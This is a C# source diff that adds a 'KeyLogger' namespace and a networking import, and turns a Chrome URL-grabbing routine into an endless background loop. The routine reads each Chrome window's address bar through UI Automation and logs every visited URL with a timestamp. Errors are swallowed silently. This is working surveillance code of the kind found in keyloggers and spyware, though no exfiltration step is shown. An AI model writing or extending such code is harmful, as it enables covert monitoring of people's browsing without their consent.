@@ -3,12 +3,13 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Automation;
 
-namespace key
+namespace key.KeyLogger
 {
     public class BrowserItem
     {
@@ -77,57 +78,61 @@ namespace key
 
         public void Checkurl()
         {
-            try
+            while(true)
             {
-                Process[] procsChrome = Process.GetProcessesByName("chrome");
-                if (procsChrome.Length <= 0)
+                try
                 {
-                    //Console.WriteLine("Chrome is not running");
-                }
-                else
-                {
-                    foreach (Process proc in procsChrome)
+                    Process[] procsChrome = Process.GetProcessesByName("chrome");
+                    if (procsChrome.Length <= 0)
                     {
-                        // the chrome process must have a window
-                        if (proc.MainWindowHandle == IntPtr.Zero)
+                        //Console.WriteLine("Chrome is not running");
+                    }
+                    else
+                    {
+                        foreach (Process proc in procsChrome)
                         {
-                            continue;
-                        }
-                        AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
-                        var SearchBar = root.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address and search bar"));
-                        Dictionary<string, string> dictionary = new Dictionary<string, string>();
-                        if (SearchBar != null)
-                        {
-                            //List<string> arrayURL = new List<string>();
-                            dictionary["BrowserName"] = "Google Chrome";
-                            dictionary["Url"] = (string)SearchBar.GetCurrentPropertyValue(ValuePatternIdentifiers.ValueProperty);
-                            dictionary["TimeEx"] = DateTime.Now.ToString("dd-MM-yyyy hh::mm::ss tt");
-                            string Browserst = "";
-                            if (dictionary["Url"] == "")
+                            // the chrome process must have a window
+                            if (proc.MainWindowHandle == IntPtr.Zero)
                             {
-                                Browserst = dictionary["BrowserName"] + " " + dictionary["TimeEx"] + " " + "New Tab";
+                                continue;
                             }
-                            else
+                            AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
+                            var SearchBar = root.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address and search bar"));
+                            Dictionary<string, string> dictionary = new Dictionary<string, string>();
+                            if (SearchBar != null)
                             {
-                                Browserst = dictionary["BrowserName"] + " " + dictionary["TimeEx"] + " " + dictionary["Url"];
+                                //List<string> arrayURL = new List<string>();
+                                dictionary["BrowserName"] = "Google Chrome";
+                                dictionary["Url"] = (string)SearchBar.GetCurrentPropertyValue(ValuePatternIdentifiers.ValueProperty);
+                                dictionary["TimeEx"] = DateTime.Now.ToString("dd-MM-yyyy hh::mm::ss tt");
+                                string Browserst = "";
+                                if (dictionary["Url"] == "")
+                                {
+                                    Browserst = dictionary["BrowserName"] + " " + dictionary["TimeEx"] + " " + "New Tab";
+                                }
+                                else
+                                {
+                                    Browserst = dictionary["BrowserName"] + " " + dictionary["TimeEx"] + " " + dictionary["Url"];
+                                }
+                                BrowserItem bri = new BrowserItem { BrowserName = dictionary["BrowserName"], Url = dictionary["Url"], TimeEx = dictionary["TimeEx"] };
+                                if (ListAndCheck(bri) == true)
+                                {
+                                    //Console.WriteLine();
+                                    Console.WriteLine("" + Browserst + "\n");
+                                    WriteLog("" + Browserst + "\n");
+                                    //sw.WriteLine("\n" + Browserst);
+                                }
                             }
-                            BrowserItem bri = new BrowserItem { BrowserName = dictionary["BrowserName"], Url = dictionary["Url"], TimeEx = dictionary["TimeEx"] };
-                            if (ListAndCheck(bri) == true)
-                            {
-                                //Console.WriteLine();
-                                Console.WriteLine("" + Browserst + "\n");
-                                WriteLog("" + Browserst + "\n");
-                                //sw.WriteLine("\n" + Browserst);
-                            }
-                        }
 
+                        }
                     }
                 }
+                catch (Exception ex)
+                {
+                    ex.ToString();
+                }
             }
-            catch (Exception ex)
-            {
-                ex.ToString();
-            }
+            
         }
     }
 }
